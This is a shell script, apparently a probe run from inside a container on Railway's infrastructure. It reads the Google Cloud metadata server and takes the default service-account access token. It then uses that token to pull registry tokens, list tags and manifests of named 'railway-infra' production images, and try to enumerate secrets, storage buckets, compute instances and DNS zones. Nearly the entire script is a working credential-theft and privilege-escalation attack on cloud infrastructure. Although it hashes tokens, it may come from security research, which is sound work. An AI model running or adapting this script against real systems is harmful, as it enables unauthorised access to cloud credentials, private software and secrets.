#!/bin/sh
# I68006 GCE metadata probe (busybox/alpine, no apk needed)
echo "=== A HOST ==="
echo "product_name=$(cat /sys/class/dmi/id/product_name 2>&1)"
echo "sys_vendor=$(cat /sys/class/dmi/id/sys_vendor 2>&1)"
echo "product_serial=$(cat /sys/class/dmi/id/product_serial 2>&1)"
echo "hostname=$(hostname 2>&1)"
echo "uname=$(uname -a 2>&1)"
echo "resolv=$(cat /etc/resolv.conf 2>&1 | tr '\n' '|')"
echo "route=$(ip route 2>&1 | tr '\n' '|')"
echo "route_meta=$(ip route get 169.254.169.254 2>&1 | tr '\n' '|')"

echo "=== B DNS 169.254.169.254:53 ==="
echo "ns_meta=$(nslookup metadata.google.internal 169.254.169.254 2>&1 | tr '\n' '|' | head -c 300)"
echo "ns_self=$(nslookup $(hostname).c.railway-infra.internal 169.254.169.254 2>&1 | tr '\n' '|' | head -c 300)"

echo "=== C META HTTP ==="
MF='Metadata-Flavor: Google'
for p in / /computeMetadata/v1/ /computeMetadata/v1/project/project-id /computeMetadata/v1/instance/name /computeMetadata/v1/instance/id /computeMetadata/v1/instance/zone /computeMetadata/v1/instance/machine-type /computeMetadata/v1/instance/service-accounts/ /computeMetadata/v1/instance/service-accounts/default/scopes /computeMetadata/v1/instance/attributes/; do
  out=$(wget -q -T 3 -t 1 -O - --header "$MF" "http://169.254.169.254$p" 2>&1)
  rc=$?
  echo "META $p rc=$rc len=$(printf %s "$out" | wc -c) body=$(printf %s "$out" | head -c 400)"
done
out=$(wget -q -T 3 -t 1 -O - "http://169.254.169.254/computeMetadata/v1/" 2>&1); echo "META_NOHEADER / rc=$? body=$(printf %s "$out" | head -c 300)"
out=$(wget -q -T 3 -t 1 -O - --header "$MF" "http://169.254.169.254/computeMetadata/v1/instance/network-interfaces/?recursive=true" 2>&1)
echo "META_NETIF rc=$? len=$(printf %s "$out" | wc -c) body=$(printf %s "$out" | head -c 600)"

echo "=== D TOKEN ==="
TOKJSON=$(wget -q -T 3 -t 1 -O - --header "$MF" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" 2>&1)
echo "TOKJSON_LEN=$(printf %s "$TOKJSON" | wc -c)"
TOK=$(printf %s "$TOKJSON" | sed -n 's/.*"access_token"[ ]*:[ ]*"\([^"]*\)".*/\1/p')
if [ -z "$TOK" ]; then echo "NO_TOKEN"; echo "=== END ==="; exit 0; fi
echo "TOKEN_LEN=$(printf %s "$TOK" | wc -c) SHA16=$(printf %s "$TOK" | sha256sum | cut -c1-16) EXPIRES=$(printf %s "$TOKJSON" | sed -n 's/.*"expires_in"[ ]*:[ ]*\([0-9]*\).*/\1/p') TYPE=$(printf %s "$TOKJSON" | sed -n 's/.*"token_type"[ ]*:[ ]*"\([^"]*\)".*/\1/p')"

echo "=== E TOKENINFO ==="
wget -q -T 8 -t 1 -O - "https://oauth2.googleapis.com/tokeninfo?access_token=$TOK" 2>&1 | head -c 800; echo

echo "=== F GAR ==="
BASIC=$(printf 'oauth2accesstoken:%s' "$TOK" | base64 | tr -d '\n')
GJ=$(wget -q -T 10 -t 1 -O - --header "Authorization: Basic $BASIC" --post-data '' "https://us-docker.pkg.dev/v2/token?service=us-docker.pkg.dev&scope=repository:railway-infra/production/backboard:pull" 2>&1)
echo "GAR_EXCH_LEN=$(printf %s "$GJ" | wc -c) BODY=$(printf %s "$GJ" | head -c 300)"
GT=$(printf %s "$GJ" | sed -n 's/.*"token"[ ]*:[ ]*"\([^"]*\)".*/\1/p')
if [ -z "$GT" ]; then echo "NO_GAR_TOKEN"; echo "=== END ==="; exit 0; fi
echo "GAR_TOKEN_LEN=$(printf %s "$GT" | wc -c) SHA16=$(printf %s "$GT" | sha256sum | cut -c1-16)"
for repo in production/backboard production/orchestrator production/storage-agent production/network-cp production/builderv3 railway/backboard; do
  out=$(wget -q -T 8 -t 1 -O - --header "Authorization: Bearer $GT" "https://us-docker.pkg.dev/v2/railway-infra/$repo/tags/list" 2>&1)
  echo "TAGS $repo rc=$? body=$(printf %s "$out" | head -c 250)"
done
for repo in production/backboard production/orchestrator production/builderv3 production/storage-agent; do
  out=$(wget -q -T 8 -t 1 -O - --header "Authorization: Bearer $GT" --header 'Accept: application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.v2+json' "https://us-docker.pkg.dev/v2/railway-infra/$repo/manifests/latest" 2>&1)
  echo "MANIFEST $repo:latest rc=$? len=$(printf %s "$out" | wc -c) body=$(printf %s "$out" | head -c 300)"
done

echo "=== G WIDE ==="
for u in "https://cloudresourcemanager.googleapis.com/v1/projects/railway-infra" "https://secretmanager.googleapis.com/v1/projects/railway-infra/secrets?pageSize=5" "https://storage.googleapis.com/storage/v1/b?project=railway-infra&maxResults=5&fields=items(name)" "https://compute.googleapis.com/compute/v1/projects/railway-infra/aggregatedList?maxResults=2" "https://dns.googleapis.com/dns/v1/projects/railway-infra/managedZones?maxResults=5"; do
  out=$(wget -q -T 10 -t 1 -O - --header "Authorization: Bearer $TOK" --header 'Accept: application/json' "$u" 2>&1)
  echo "WIDE $(echo $u | cut -c9-60) rc=$? body=$(printf %s "$out" | head -c 350)"
done
echo "=== END ==="
